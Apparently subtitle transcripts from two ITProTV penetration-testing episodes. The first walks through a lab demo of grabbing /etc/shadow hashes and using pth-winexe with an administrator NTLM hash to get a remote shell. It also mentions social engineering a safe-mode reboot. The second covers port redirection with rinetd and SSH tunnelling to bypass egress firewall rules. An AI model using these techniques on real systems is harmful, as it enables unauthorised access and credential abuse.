00:10:27.580\nI've got a file waiting for me.\n\n211\n00:10:27.580 --> 00:10:29.800\nNow all I gotta do is run it\nthrough my password crackers.\n\n212\n00:10:29.800 --> 00:10:32.490\nSo that is password grabbing.\n\n213\n00:10:32.490 --> 00:10:35.993\nI'm gonna grab it out of the,\nI didn't show you etc shadow.\n\n214\n00:10:35.993 --> 00:10:39.087\nI'll just cancel etc/shadow.\n\n215\n00:10:39.087 --> 00:10:43.980\nThere you go,\nthere's the encrypted hashes.\n\n216\n00:10:43.980 --> 00:10:46.780\nSo you just copy that to a file, and\n\n217\n00:10:46.780 --> 00:10:49.380\nthen run that file through\nyour password cracker.\n\n218\n00:10:51.110 --> 00:10:52.860\nAll right, where are we at here?\n\n219\n00:10:52.860 --> 00:10:55.780\nWe are on a very interesting topic.\n\n220\n00:10:55.780 --> 00:10:59.180\nSometimes, we've shown you all\nabout cracking these passwords,\n\n221\n00:10:59.180 --> 00:11:00.570\nrunning them through a cracker.\n\n222\n00:11:00.570 --> 00:11:04.250\nSometimes trying to get\nthe password value, what that is.\n\n223\n00:11:04.250 --> 00:11:08.110\nBut not every time do you actually\nneed to break the password.\n\n224\n00:11:09.260 --> 00:11:10.560\nThat makes sense.\n\n225\n00:11:10.560 --> 00:11:14.100\nYou have the hashed value of the password.\n\n226\n00:11:14.100 --> 00:11:17.798\nSometimes you can just spit\nthat to your end User and\n\n227\n00:11:17.798 --> 00:11:22.430\nit will accept it because\nthe hashes equal each other.\n\n228\n00:11:22.430 --> 00:11:28.670\nNow, I think this only works, there\nare some caveats to being able to do this.\n\n229\n00:11:28.670 --> 00:11:32.150\nAnd I wrote them down so that I don't\nforget any of them for you good people so\n\n230\n00:11:32.150 --> 00:11:34.080\nthat you don't go this isn't working, man.\n\n231\n00:11:34.080 --> 00:11:35.900\nI'm trying this and it's not working.\n\n232\n00:11:35.900 --> 00:11:41.460\nYes, if you don't understand where this\nworks, then it won't work, obviously.\n\n233\n00:11:41.460 --> 00:11:45.400\nSo the caveats are that this works\nagainst NTLM authentication.\n\n234\n00:11:46.460 --> 00:11:49.850\nAnd this is under, so\nWindows systems that use NTLM.\n\n235\n00:11:51.430 --> 00:11:54.470\nThings like NetBios or SMB, right?\n\n236\n00:11:54.470 --> 00:11:56.070\nIf you see SMB, it could work there.\n\n237\n00:11:57.250 --> 00:11:59.495\nLinux, it will work in Linus, or MacOS.\n\n238\n00:11:59.495 --> 00:12:01.628\nAnything that would run Samba,\n\n239\n00:12:01.628 --> 00:12:05.345\ncuz Samba is basically a hacked\nversion of SMB, right?\n\n240\n00:12:05.345 --> 00:12:07.350\nSo, there you go.\n\n241\n00:12:07.350 --> 00:12:11.280\nIt's using NTLM, or\nany service that is using NTLM.\n\n242\n00:12:11.280 --> 00:12:12.090\nSo look for SMB.\n\n243\n00:12:12.090 --> 00:12:17.420\nThere's a great SANS institute\npaper on this very topic.\n\n244\n00:12:17.420 --> 00:12:19.960\nIt's called Passing the Hash, and\n\n245\n00:12:19.960 --> 00:12:22.560\nI've linked it into our show notes so\nyou can just follow the link.\n\n246\n00:12:22.560 --> 00:12:25.850\nIt'll take you there, you can read\nthat paper, it's a great read.\n\n247\n00:12:25.850 --> 00:12:28.330\nA word on Windows 10.\n\n248\n00:12:28.330 --> 00:12:32.260\nWindows 10 isn't\nsusceptible to this per se.\n\n249\n00:12:33.300 --> 00:12:37.220\nYou have to kind of, what you have\nto do is boot it into safe mode.\n\n250\n00:12:37.220 --> 00:12:40.000\nOnce a Windows 10 machine\nis booted into safe mode,\n\n251\n00:12:40.000 --> 00:12:43.280\nthen you are able to perform this.\n\n252\n00:12:43.280 --> 00:12:46.270\nSo if you can social engineer someone into\nrebooting their system into safe mode,\n\n253\n00:12:46.270 --> 00:12:49.660\nor if you have some sort of limited access\nwhere you can get it to reboot into safe\n\n254\n00:12:49.660 --> 00:12:54.200\nmode, then you'll need to do that for\nWindows 10 environments.\n\n255\n00:12:54.200 --> 00:12:59.330\nI am running Window 7, obviously,\nso let's see how does this work.\n\n256\n00:12:59.330 --> 00:13:02.340\nWhat do you mean, Mr. Lowry, about this?\n\n257\n00:13:02.340 --> 00:13:03.570\nLet me cross this stuff down.\n\n258\n00:13:04.690 --> 00:13:05.950\nLog out here.\n\n259\n00:13:05.950 --> 00:13:06.450\nLog off.\n\n260\n00:13:07.850 --> 00:13:08.660\nJust get it out of our way.\n\n261\n00:13:08.660 --> 00:13:10.910\nLet me clear our screen.\n\n262\n00:13:12.130 --> 00:13:12.660\nClear our screen.\n\n263\n00:13:13.960 --> 00:13:15.790\nI like a clean slate here.\n\n264\n00:13:15.790 --> 00:13:18.067\nGet back into correct directory.\n\n265\n00:13:19.838 --> 00:13:25.850\nCT, there we go, cd attack,\nand password stuff.\n\n266\n00:13:25.850 --> 00:13:26.350\nThere we go.\n\n267\n00:13:28.970 --> 00:13:30.070\nSo how do we do this?\n\n268\n00:13:30.070 --> 00:13:34.610\nIt's called the PTH Tools,\npass the hash tool sets.\n\n269\n00:13:34.610 --> 00:13:36.840\nIf you have Kali Linux,\nit should be installed already.\n\n270\n00:13:36.840 --> 00:13:40.070\nIf not, Google Pass the Hash tools.\n\n271\n00:13:40.070 --> 00:13:41.810\nAnd I think it's a GitHub repository.\n\n272\n00:13:41.810 --> 00:13:43.080\nDid I write down where to get it?\n\n273\n00:13:43.080 --> 00:13:44.622\nNo, I didn't.\nSorry about that, guys.\n\n274\n00:13:44.622 --> 00:13:47.435\nBut Google's our friend,\nyou know how to use that.\n\n275\n00:13:47.435 --> 00:13:52.330\nAnd now, all we have to do is\nuse the win EXC P-A-T-H tool.\n\n276\n00:13:52.330 --> 00:13:54.780\nIt's pth-winexe.\n\n277\n00:13:54.780 --> 00:13:59.390\nOf course, the machine has to\nbe running the NTLM, right?\n\n278\n00:13:59.390 --> 00:14:01.290\nSo something like SMB.\n\n279\n00:14:01.290 --> 00:14:05.224\nOurs is, so let's see how that works,\nand see what it will do.\n\n280\n00:14:06.957 --> 00:14:11.626\nI go pth-winexe, just like that.\n\n281\n00:14:11.626 --> 00:14:12.250\n-u.\n\n282\n00:14:12.250 --> 00:14:17.400\nThen you give it a user account for\nu, right?\n\n283\n00:14:17.400 --> 00:14:19.120\nSo, we're gonna log in as administrator.\n\n284\n00:14:21.840 --> 00:14:22.986\nAdministrator, like that.\n\n285\n00:14:22.986 --> 00:14:28.680\nThen you want to give it the password, and\nyou separate the two using a percent sign.\n\n286\n00:14:28.680 --> 00:14:30.990\nSo you just put a percent there.\n\n287\n00:14:30.990 --> 00:14:36.210\nAnd you also have to\nform it in a certain way.\n\n288\n00:14:36.210 --> 00:14:43.650\nIf I've got this little thing here,\nwhich is called empty_LM.txt.\n\n289\n00:14:43.650 --> 00:14:48.810\nIf I cut that, cut empty,\nI've got the string.\n\n290\n00:14:48.810 --> 00:14:52.840\nAnd basically what this\nis is an empty LM hash,\n\n291\n00:14:52.840 --> 00:14:57.150\nbecause this tool requires\nan LM hash to be there.\n\n292\n00:14:57.150 --> 00:15:01.720\nAnd since there's not one, cuz we're\nusing NTLM, it shows that empty string.\n\n293\n00:15:01.720 --> 00:15:05.460\nSo if we looked at that two hash,\nso cat two hash,\n\n294\n00:15:05.460 --> 00:15:10.390\nyou see these right here\nwhere it says no password.\n\n295\n00:15:11.690 --> 00:15:15.728\nThat's because there's no, I'm sorry,\n\n296\n00:15:15.728 --> 00:15:19.760\nthere's no LM hash there, it's empty.\n\n297\n00:15:19.760 --> 00:15:21.390\nThey don't use that anymore.\n\n298\n00:15:21.390 --> 00:15:22.570\nThere's only NTLM.\n\n299\n00:15:22.570 --> 00:15:27.820\nSo we have to feed it one that has no\nvalue, and that's what this string is.\n\n300\n00:15:27.820 --> 00:15:31.875\nI've just Google searched that,\nempty LM hash value, and\n\n301\n00:15:31.875 --> 00:15:35.700\nwebsite after website was\navailable to give that to me.\n\n302\n00:15:35.700 --> 00:15:38.120\nSo, let's see here,\nI didn't have that, let's cat that.\n\n303\n00:15:38.120 --> 00:15:42.260\nLet me clear that out cuz that's\nlooking crazy, cat empty on hash.\n\n304\n00:15:42.260 --> 00:15:49.720\nSo you'll need that value, copy it out,\ncopy, paste it over there.\n\n305\n00:15:49.720 --> 00:15:52.650\nAnd then give it a colon.\n\n306\n00:15:52.650 --> 00:15:57.460\nAnd now we're gonna give it the actual\nNTLM hash of our administrator,\n\n307\n00:15:57.460 --> 00:16:00.920\nwhich we got when we copied and\npasted that.\n\n308\n00:16:00.920 --> 00:16:03.770\nSo I can say, [INAUDIBLE] hash cat 2Hash.\n\n309\n00:16:06.050 --> 00:16:09.320\nAnd here's administrator, well,\nat the time that it happens,\n\n310\n00:16:09.320 --> 00:16:12.280\nI'll take another user account,\ncuz they're all the same.\n\n311\n00:16:12.280 --> 00:16:14.270\nI made it all password1.\n\n312\n00:16:14.270 --> 00:16:16.170\nSo it doesn't matter which one I grab.\n\n313\n00:16:16.170 --> 00:16:19.601\nBut I would've grabbed administrator\nif that had been available.\n\n314\n00:16:19.601 --> 00:16:22.644\nCopy and then paste that value there.\n\n315\n00:16:25.000 --> 00:16:26.700\nAnd let's see here.\n\n316\n00:16:26.700 --> 00:16:29.906\nThen you do //.\n\n317\n00:16:31.576 --> 00:16:33.564\nI don't know if I'm gonna do ipcmd.\n\n318\n00:16:33.564 --> 00:16:35.031\nLet me see here.\n\n319\n00:16:35.031 --> 00:16:36.470\nI think I actually have to put the IP in.\n\n320\n00:16:36.470 --> 00:16:40.432\nI'm following my notes here.\n\n321\n00:16:40.432 --> 00:16:46.860\n192.168.219.200, and\nthen Cmd is the command prompt.\n\n322\n00:16:48.100 --> 00:16:49.710\nAnd there you go, look at that.\n\n323\n00:16:49.710 --> 00:16:54.240\nSo, I've passed the hash values\ninstead of a cracked password\n\n324\n00:16:54.240 --> 00:16:55.790\nto gain access to that system.\n\n325\n00:16:55.790 --> 00:16:58.630\nAnd as you can see, I can say who am I?\n\n326\n00:16:58.630 --> 00:17:01.090\nAnd I'm logged in as administrator.\n\n327\n00:17:01.090 --> 00:17:04.660\nI think it only works for\nthe administrator account as well.\n\n328\n00:17:04.660 --> 00:17:07.360\nCould be wrong on that, but\nif I'm remembering correctly,\n\n329\n00:17:07.360 --> 00:17:09.940\nsomething's telling me in my brain\nhey don't forget to tell them I think\n\n330\n00:17:09.940 --> 00:17:11.440\nthis only works for\nthe administrator account.\n\n331\n00:17:11.440 --> 00:17:13.680\nIf it doesn't, great, and\nyou can use any account.\n\n332\n00:17:13.680 --> 00:17:16.930\nBut I know for a fact it definitely works\nfor the administrator account just about\n\n333\n00:17:16.930 --> 00:17:19.300\nevery time,\nas long as you have those two values.\n\n334\n00:17:19.300 --> 00:17:22.500\nAnd that, my good friends,\nis passing the hash.\n\n335\n00:17:22.500 --> 00:17:23.920\nKind of dangerous if you think about it.\n\n336\n00:17:23.920 --> 00:17:25.100\nI didn't have to crack anything.\n\n337\n00:17:25.100 --> 00:17:29.110\nI just had to grab an encrypted value and\nslap it in there.\n\n338\n00:17:29.110 --> 00:17:31.350\nAnd let it go yeah, well that's right.\n\n339\n00:17:31.350 --> 00:17:35.170\n&gt;&gt; Yeah, that's the scary part is why\nbother cracking the password when I can\n\n340\n00:17:35.170 --> 00:17:36.970\njust use what you sent?\n\n341\n00:17:36.970 --> 00:17:39.000\nAll I need to do is get that hash value.\n\n342\n00:17:39.000 --> 00:17:40.340\nAlso notice what Daniel did there.\n\n343\n00:17:40.340 --> 00:17:43.470\nHe did what we call\na kind of a side channel.\n\n344\n00:17:43.470 --> 00:17:47.890\nI couldn't take that hash and\ngo to a log on screen and\n\n345\n00:17:47.890 --> 00:17:50.500\ntype in your username and\npaste the hash value in there.\n\n346\n00:17:50.500 --> 00:17:52.240\nYou might think well, why?\n\n347\n00:17:52.240 --> 00:17:55.520\nYou're telling me that the hash is getting\nsubmitted and compared to the database.\n\n348\n00:17:55.520 --> 00:17:59.490\nThat's not gonna work because whatever you\ntype in there, it's expecting plaintext.\n\n349\n00:17:59.490 --> 00:18:02.370\nAnd it's gonna run it through\nthe hashing algorithms either\n\n350\n00:18:02.370 --> 00:18:03.540\nLAN manager, NTLM or both.\n\n351\n00:18:03.540 --> 00:18:05.190\n&gt;&gt; It's kinda like rehash the hash.\n\n352\n00:18:05.190 --> 00:18:08.450\n&gt;&gt; Exactly, it'll rehash the hash, and\nit's no longer gonna match the hash value\n\n353\n00:18:08.450 --> 00:18:11.310\nthat's stored in the database,\nso it's not gonna work.\n\n354\n00:18:11.310 --> 00:18:14.440\nSo you saw him go through a side channel\nand say look, I'm not gonna use that.\n\n355\n00:18:14.440 --> 00:18:15.580\nI'm just gonna submit this.\n\n356\n00:18:15.580 --> 00:18:20.230\nHere it is, here's the user name, here's\nthe hashed password, please take that.\n\n357\n00:18:20.230 --> 00:18:21.160\nAnd that's what works.\n\n358\n00:18:21.160 --> 00:18:22.520\n&gt;&gt; That's it.\n&gt;&gt; Scary stuff.\n\n359\n00:18:22.520 --> 00:18:25.000\n&gt;&gt; Well, Mike, that's passing the hash,\nthat's password grabbing,\n\n360\n00:18:25.000 --> 00:18:27.030\nthat's brute force, dictionary tags,\n\n361\n00:18:27.030 --> 00:18:31.360\npasswords all enrolled in one if you\ncount episode part one of this as well.\n\n362\n00:18:31.360 --> 00:18:33.310\nAnd that's all I got when\nit comes to passwords.\n\n363\n00:18:33.310 --> 00:18:37.660\nIt can be daunting task, a lot of sitting\naround, twirling our thumbs, waiting for\n\n364\n00:18:37.660 --> 00:18:39.320\npasswords to get cracked.\n\n365\n00:18:39.320 --> 00:18:41.870\nBut that's the name of the game ladies and\ngentlemen, if you wanna get in,\n\n366\n00:18:41.870 --> 00:18:43.160\npatience does pay.\n\n367\n00:18:43.160 --> 00:18:46.380\n&gt;&gt; It definitely is, and Daniel we thank\nyou greatly for all that information.\n\n368\n00:18:46.380 --> 00:18:49.370\nFantastic demonstrations,\nfantastic explanations.\n\n369\n00:18:49.370 --> 00:18:51.040\nSo again, thank you for that.\n\n370\n00:18:51.040 --> 00:18:51.540\n&gt;&gt; No problem.\n\n371\n00:18:51.540 --> 00:18:53.850\n&gt;&gt; We hope everybody out there\nenjoyed watching this one.\n\n372\n00:18:53.850 --> 00:18:56.620\nSigning off for

00:00:12.007\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:12.007 --> 00:00:15.350\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n5\n00:00:15.350 --> 00:00:19.010\nI'm your host Mike Rodrick, and\ntoday we're doing penetration testing.\n\n6\n00:00:19.010 --> 00:00:23.700\nIn this episode we're gonna be\nlooking at port redirection.\n\n7\n00:00:23.700 --> 00:00:26.610\nAnd here to tell us all about it is Mr.\nDaniel Lowrie.\n\n8\n00:00:26.610 --> 00:00:27.470\nWelcome back, Daniel.\n\n9\n00:00:27.470 --> 00:00:28.740\n&gt;&gt; Man, I'm so glad to be back.\n\n10\n00:00:28.740 --> 00:00:30.990\nYes, we are here for\nport redirection today.\n\n11\n00:00:30.990 --> 00:00:32.920\nThis is gonna be a lot of fun.\n\n12\n00:00:32.920 --> 00:00:37.120\nIf you like brain twisters and\nteasers and things of that nature,\n\n13\n00:00:37.120 --> 00:00:40.680\nyou're gonna really love this because\nthat's basically what this boils down to.\n\n14\n00:00:40.680 --> 00:00:43.540\nThis is one of the things that makes your\nhead hurt when you're looking at it and\n\n15\n00:00:43.540 --> 00:00:45.680\ntrying to understand what's going on.\n\n16\n00:00:45.680 --> 00:00:49.770\nBut it's a really cool technique for\nus to be able to [COUGH],\n\n17\n00:00:49.770 --> 00:00:53.570\nexcuse me,\nbypass firewall restrictions, and\n\n18\n00:00:53.570 --> 00:00:58.330\nthings of that nature, which can be\nhelpful when we're attacking systems.\n\n19\n00:00:58.330 --> 00:01:00.870\nSo, that being in mind,\nlet's just jump right into the fray,\n\n20\n00:01:00.870 --> 00:01:02.840\nand let's start learning\nabout port redirection.\n\n21\n00:01:02.840 --> 00:01:08.460\nWhat we're doing is basically we're\ngonna if one port is blocked right,\n\n22\n00:01:08.460 --> 00:01:11.860\nbut another port is open,\nwell I wanna use the open port and\n\n23\n00:01:11.860 --> 00:01:14.270\nredirect traffic that normally\nwould go out of the blocked port.\n\n24\n00:01:14.270 --> 00:01:16.850\nThat's kind of the idea, right.\n\n25\n00:01:16.850 --> 00:01:19.880\nSo maybe I've got a web server and\n\n26\n00:01:19.880 --> 00:01:24.140\nit's allowing ingress into port 80 right,\nwith the firewall.\n\n27\n00:01:24.140 --> 00:01:26.280\nBut it's not allowing egress\nout of any other port but\n\n28\n00:01:26.280 --> 00:01:29.340\n80 as well cuz it's a web server.\n\n29\n00:01:29.340 --> 00:01:32.430\nWhat does it need with SSH or\nanything of that nature?\n\n30\n00:01:32.430 --> 00:01:36.420\nOr maybe it's just running SSH in 80 so\nsomeone can have remote access to it.\n\n31\n00:01:36.420 --> 00:01:39.310\nAnd it's a web server,\nbasic, nothing else.\n\n32\n00:01:39.310 --> 00:01:40.620\nThat's all you get.\n\n33\n00:01:40.620 --> 00:01:43.080\nThat's actually a very common\nway to set a firewall up,\n\n34\n00:01:43.080 --> 00:01:44.360\nespecially with the egress rules.\n\n35\n00:01:44.360 --> 00:01:48.560\nYou don't want people getting in and\nthen coming back out or going out and\n\n36\n00:01:48.560 --> 00:01:51.660\nservices happens and companies a lot\nthey don't want you surfing Facebook or\n\n37\n00:01:51.660 --> 00:01:52.560\nthings of that nature.\n\n38\n00:01:52.560 --> 00:01:55.730\nSo they just block those ports or\nthey blacklist them.\n\n39\n00:01:55.730 --> 00:02:00.857\nThey don't necessarily block a port,\nthey block the site using a proxy server.\n\n40\n00:02:00.857 --> 00:02:01.711\n&gt;&gt; Proxies yep.\n\n41\n00:02:01.711 --> 00:02:03.470\n&gt;&gt; But the idea is the same kind of thing.\n\n42\n00:02:03.470 --> 00:02:06.900\nYou're blocking ports instead\nof blocking sites okay?\n\n43\n00:02:08.000 --> 00:02:10.370\nAnd so what if I wanna be\nable to get to that site?\n\n44\n00:02:10.370 --> 00:02:12.590\nWhat they're not allowing\nme to web surf at all?\n\n45\n00:02:12.590 --> 00:02:15.580\nAnd port 80 inside of my company\nis keeping me out, right?\n\n46\n00:02:15.580 --> 00:02:17.340\nIts blocked off, I can't surf the web.\n\n47\n00:02:18.650 --> 00:02:21.950\nI can set up a machine at home and\n\n48\n00:02:21.950 --> 00:02:26.910\nuse it as a proxy, go out through\nany open port that is allowed,\n\n49\n00:02:26.910 --> 00:02:29.810\nproxy from there,\nhave it return through that open port.\n\n50\n00:02:29.810 --> 00:02:33.410\nSo that's port redirection,\nwe're gonna redirect through those ports.\n\n51\n00:02:33.410 --> 00:02:36.100\nAnd yeah, if that was like\nwhat are you talking about?\n\n52\n00:02:36.100 --> 00:02:39.433\nHopefully it'll make a little more sense,\nI have diagrams and everything.\n\n53\n00:02:39.433 --> 00:02:43.320\n[LAUGH] We're gonna draw pictures,\nMike's gonna have some puppets.\n\n54\n00:02:43.320 --> 00:02:45.265\nIt's gonna be a lot of good times.\n\n55\n00:02:45.265 --> 00:02:48.640\n[LAUGH] So hopefully at the end of it,\nyou'll understand a little better.\n\n56\n00:02:48.640 --> 00:02:50.150\nAll right so where do we wanna start?\n\n57\n00:02:50.150 --> 00:02:52.020\nLet's start with port forwarding.\n\n58\n00:02:53.090 --> 00:02:58.034\nAgain used to bypass restrictions by\nforwarding data through your proxy\n\n59\n00:02:58.034 --> 00:02:58.770\nservers.\n\n60\n00:02:58.770 --> 00:03:00.660\nSo that's the most simple.\n\n61\n00:03:00.660 --> 00:03:03.980\nLet's take a look at my diagram here.\n\n62\n00:03:03.980 --> 00:03:06.739\nSo this should give you a better\nidea of what is happening.\n\n63\n00:03:08.430 --> 00:03:13.211\nOver here we have a client machine\nwhich is behind a firewall, okay.\n\n64\n00:03:13.211 --> 00:03:19.140\nAnd over here we have basically\nthe Internet, it's my pretty little cloud.\n\n65\n00:03:19.140 --> 00:03:22.920\nAnd there's my proxy machine that I\nset up maybe at home or wherever.\n\n66\n00:03:24.140 --> 00:03:27.830\nAnd then I've got this cool web server\nthat I love to peruse to my favorite\n\n67\n00:03:27.830 --> 00:03:32.980\nwebsite maybe it's ITProTV or\nDevProTV, something cool.\n\n68\n00:03:32.980 --> 00:03:34.045\nYeah, something like that.\n\n69\n00:03:34.045 --> 00:03:35.063\n&gt;&gt; Matchbox.com.\n\n70\n00:03:35.063 --> 00:03:37.181\n&gt;&gt; Yeah, definitely matchbox.com.\n\n71\n00:03:37.181 --> 00:03:39.460\nThat is a cool site.\n\n72\n00:03:39.460 --> 00:03:41.350\nBut I can't get there from\nwork because what's happening?\n\n73\n00:03:41.350 --> 00:03:45.850\nFirewall is blocking outbound\nweb requests, ports 80 and 443.\n\n74\n00:03:45.850 --> 00:03:51.410\nI can't surf the web because ports 80 and\n443 do not allow me to go out.\n\n75\n00:03:51.410 --> 00:03:52.770\nI can't go out of those ports.\n\n76\n00:03:53.820 --> 00:03:57.300\nBut it's not blocking any other ports,\nright?\n\n77\n00:03:57.300 --> 00:04:01.690\nSo what I do is I set my proxy machine\nto basically listen on port 2222.\n\n78\n00:04:01.690 --> 00:04:06.176\nI use a service to set all this up.\n\n79\n00:04:06.176 --> 00:04:08.708\nAnd then I just attack on 2222 and\n\n80\n00:04:08.708 --> 00:04:13.527\nI use some command line Tom Foolerry and\nwe get out, it does the work for\n\n81\n00:04:13.527 --> 00:04:17.706\nme, brings it back and\nthen sends it back over the same port.\n\n82\n00:04:17.706 --> 00:04:19.778\nThat's in essence what's gonna happen.\n\n83\n00:04:19.778 --> 00:04:21.419\nSo what do we need to be able to do this?\n\n84\n00:04:21.419 --> 00:04:23.331\nWe need a proxy server service.\n\n85\n00:04:23.331 --> 00:04:27.953\nThe one I have installed\nin my Kali Linux is Rinetd,\n\n86\n00:04:27.953 --> 00:04:30.973\nD- R-I-N-E-T-D, right?\n\n87\n00:04:30.973 --> 00:04:33.810\nI think that's it or how it's spelled.\n\n88\n00:04:33.810 --> 00:04:35.622\nYeah, R-I-N-E-T-D.\n\n89\n00:04:35.622 --> 00:04:40.746\nAnd to set it up, you go to\nthe rinettd.conf file which is an etsy,\n\n90\n00:04:40.746 --> 00:04:42.310\nmake a few changes.\n\n91\n00:04:42.310 --> 00:04:45.226\nLet's take a look at that,\ngo back over to Kali.\n\n92\n00:04:45.226 --> 00:04:53.690\nWe will cat/etsy/rynettd.conf and\n\n93\n00:04:53.690 --> 00:04:56.720\nthere is the configuration file and\nhere's what I did.\n\n94\n00:04:56.720 --> 00:05:01.279\nYou get these columns where\nyou need to set some data up,\n\n95\n00:05:01.279 --> 00:05:07.400\nthat's basically giving you the structure\nand here is my server, right.\n\n96\n00:05:07.400 --> 00:05:09.720\nSo that's my Kali box.\n\n97\n00:05:09.720 --> 00:05:12.730\nHere's the port that I want to bind it to,\nand\n\n98\n00:05:12.730 --> 00:05:15.040\nthen here's the address\nthat's going to connect.\n\n99\n00:05:15.040 --> 00:05:17.583\nI actually need to change that,\nbecause that is different now.\n\n100\n00:05:17.583 --> 00:05:20.266\nSo let's do that,\n\n101\n00:05:20.266 --> 00:05:25.978\nlet's say nano /etc/rinetd.conf.\n\n102\n00:05:25.978 --> 00:05:31.305\nAnd I'm gonna go in here and\nI'm gonna change that to the IP\n\n103\n00:05:31.305 --> 00:05:36.980\naddress of the client machines\nthat's behind the firewall.\n\n104\n00:05:38.900 --> 00:05:42.750\nSo there's no longer 158, I statistically\nset it to 200 cuz it kept changing on me.\n\n105\n00:05:42.750 --> 00:05:46.040\nAnd then the connection\nport is gonna be 80, right.\n\n106\n00:05:46.040 --> 00:05:49.120\nThat's what you need there because\nI wanna get to port 80, ultimately.\n\n107\n00:05:50.150 --> 00:05:55.649\nSo save that, control X, and now,\nlet's see here, we added that line,\n\n108\n00:05:55.649 --> 00:06:00.540\nthe proxy is ready to go,\nmake sure you start the service.\n\n109\n00:06:00.540 --> 00:06:02.658\nSo I can do it the old fashion way.\n\n110\n00:06:02.658 --> 00:06:05.239\nService, rinetd, is that it?\n\n111\n00:06:05.239 --> 00:06:10.496\nYeah, rinetd,\nI can never get this straight in my head.\n\n112\n00:06:10.496 --> 00:06:13.050\nAnd then,\nI'll just restart just to make sure.\n\n113\n00:06:13.050 --> 00:06:16.060\nIf it was already started,\nit's been restarted, so there you go.\n\n114\n00:06:16.060 --> 00:06:18.240\nService is started, it's ready to go.\n\n115\n00:06:18.240 --> 00:06:21.290\nThe configuration file has\nbeen configured correctly.\n\n116\n00:06:21.290 --> 00:06:25.466\nNow we need to jump over to our browser,\nall right.\n\n117\n00:06:25.466 --> 00:06:31.949\nSo actually, so in this scenario,\nthis is my Windows 7 machine and\n\n118\n00:06:31.949 --> 00:06:36.178\nit's acting as our cool web server, okay.\n\n119\n00:06:36.178 --> 00:06:40.069\nAnd it is so yeah, maybe I yeah,\nit is acting as our cool web server.\n\n120\n00:06:41.180 --> 00:06:43.540\nIt is running port 80,\nit's got Apache running.\n\n121\n00:06:43.540 --> 00:06:48.280\nAs you can see,\nif I open up my browser, and\n\n122\n00:06:48.280 --> 00:06:55.220\nI type in 127.0.0.1,\nI get My Guestbook that I created.\n\n123\n00:06:55.220 --> 00:06:57.600\nI didn't start the SQL back end, so\n\n124\n00:06:57.600 --> 00:07:01.180\nI'm getting an error here, but\njust a basic website, right?\n\n125\n00:07:01.180 --> 00:07:02.670\nThat's my cool website.\n\n126\n00:07:02.670 --> 00:07:03.660\n&gt;&gt; That's pretty cool, Daniel.\n\n127\n00:07:03.660 --> 00:07:04.870\n&gt;&gt; Yeah, it's awesome.\n\n128\n00:07:04.870 --> 00:07:08.400\nI'm a super website creator, obviously,\n&gt;&gt; [LAUGH]\n\n129\n00:07:08.400 --> 00:07:09.020\n&gt;&gt; Here's my client,\n\n130\n00:07:09.020 --> 00:07:10.970\nI'm just gonna use my MacBook.\n\n131\n00:07:10.970 --> 00:07:16.273\nI will go to Firefox here,\n\n132\n00:07:16.273 --> 00:07:19.172\nfire that up.\n\n133\n00:07:19.172 --> 00:07:23.559\nAnd I will browse to http:// and\n\n134\n00:07:23.559 --> 00:07:27.793\nI'm gonna browse to my Kali box,\n\n135\n00:07:27.793 --> 00:07:32.224\ncuz that's what bound the ports.\n\n136\n00:07:32.224 --> 00:07:32.929\nRight, but\nI wonder what happens when I do that?\n\n137\n00:07:32.929 --> 00:07:33.633\nAll right, we'll see.\n\n138\n00:07:33.633 --> 00:07:41.083\n192.168.219.146, and\nthen that port I set, so :2222.\n\n139\n00:07:41.083 --> 00:07:45.790\nHit Return, and look what I get.\n\n140\n00:07:45.790 --> 00:07:47.210\nSo what did it do?\n\n141\n00:07:47.210 --> 00:07:49.141\nIt contacted the Kali box.\n\n142\n00:07:49.141 --> 00:07:52.402\nThe Kali box says you\ncame in on port 2222.\n\n143\n00:07:52.402 --> 00:07:56.754\nI've got a service that says if you come\nin on that port To redirect you to this\n\n144\n00:07:56.754 --> 00:08:00.560\nweb server on port 80 and\nthen return that back to you.\n\n145\n00:08:00.560 --> 00:08:03.188\nSo I get this instead\nof it cannot be found,\n\n146\n00:08:03.188 --> 00:08:05.527\nbecause I'm not running a page on it.\n\n147\n00:08:05.527 --> 00:08:06.054\n&gt;&gt; Fantastic.\n\n148\n00:08:06.054 --> 00:08:07.510\n&gt;&gt; So very cool right?\n\n149\n00:08:07.510 --> 00:08:09.090\nThat's basic port forwarding.\n\n150\n00:08:10.480 --> 00:08:12.170\nSo let's bump our game up just a hair.\n\n151\n00:08:13.280 --> 00:08:18.040\nLet's go back over here, or actually\nlet's bring up our simple diagram.\n\n152\n00:08:19.670 --> 00:08:21.037\nLet's look at SSH tunneling.\n\n153\n00:08:23.525 --> 00:08:26.969\nNot really seeing a lot of difference\nwhen it comes to the diagram,\n\n154\n00:08:26.969 --> 00:08:29.430\nexcept for some specific information.\n\n155\n00:08:29.430 --> 00:08:32.150\nFirewall's still blocking\noutbound web requests.\n\n156\n00:08:32.150 --> 00:08:34.700\nBut the time what we're gonna\ndo is instead of using rinetd as\n\n157\n00:08:34.700 --> 00:08:35.589\na service, we're going use SSH.\n\n158\n00:08:37.180 --> 00:08:39.980\nSSH can actually do this stuff for us.\n\n159\n00:08:39.980 --> 00:08:41.560\nSo let's take a look at\nall the information there.\n\n160\n00:08:41.560 --> 00:08:44.950\nThank you, Megan, for doing that for us.\n\n161\n00:08:44.950 --> 00:08:49.080\nWe've got a cool web server, now all we\nhave to do is make sure it's running SSH\n\n162\n00:08:49.080 --> 00:08:51.580\non our, basically becoming our proxy here.\n\n163\n00:08:51.580 --> 00:08:54.620\nAnd it's just running on port 22.\n\n164\n00:08:54.620 --> 00:08:56.560\nIt's not being blocked by this.\n\n165\n00:08:56.560 --> 00:09:01.560\nAnd over here we are going to\nbind that to port 8080 just\n\n166\n00:09:02.720 --> 00:09:05.690\nso I don't mess with RINETD,\nI'll just choose a different port.\n\n167\n00:09:05.690 --> 00:09:08.430\n8080, that's a common port used for\nproxying.\n\n168\n00:09:09.810 --> 00:09:13.070\nAnd then when our client\nmachine fires up a web browser,\n\n169\n00:09:13.070 --> 00:09:17.230\nwe're going to go to\n127.0.0.1 instead of Going\n\n170\n00:09:19.750 --> 00:09:24.870\nto 192, the collie's box cuz it's a little\nweird in the way this works, okay?\n\n171\n00:09:24.870 --> 00:09:26.165\nLet me make sure I'm following my notes,\n\n172\n00:09:26.165 --> 00:09:28.390\nI want to make sure I get you every\npiece of information I wanna tell you.\n\n173\n00:09:28.390 --> 00:09:36.870\nSo what we do is we bind an egress allowed\nlocal ports from our local machine.\n\n174\n00:09:36.870 --> 00:09:43.760\nSo on that machine, so\nthe apple My Apple Box, my 